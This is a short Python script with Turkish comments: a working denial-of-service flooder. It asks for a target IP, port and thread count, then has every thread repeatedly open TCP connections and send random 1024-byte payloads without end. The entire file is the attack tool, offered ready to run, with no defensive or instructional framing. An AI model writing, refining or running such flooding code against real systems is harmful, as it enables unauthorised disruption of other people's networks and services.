import socket
import threading
import random

def dos_attack(target_ip, target_port):
    message = random._urandom(1024)  # 1024 byte boyutunda rastgele veri
    
    while True:
        try:
            # Yeni bir socket oluşturuyoruz ve bağlantı kuruyoruz
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            
            # Bağlantı kurulduktan sonra sürekli veri gönderiyoruz
            for _ in range(10):  # Aynı bağlantı üzerinden birkaç kez veri gönder
                s.sendall(message)
            print(f"[+] Packet sent to {target_ip}:{target_port}")
            
        except Exception as e:
            print(f"[-] Error: {e}")
        finally:
            s.close()

def start_attack(target_ip, target_port, num_threads):
    # Her thread bir paralel bağlantıyı temsil eder
    for i in range(num_threads):
        thread = threading.Thread(target=dos_attack, args=(target_ip, target_port))
        thread.start()

if __name__ == "__main__":
    target_ip = input("Hedef IP: ")
    target_port = int(input("Hedef Port: "))
    num_threads = int(input("Thread Sayısı: "))
    
    # Belirtilen sayıda paralel bağlantı kurmak için saldırıyı başlatıyoruz
    start_attack(target_ip, target_port, num_threads)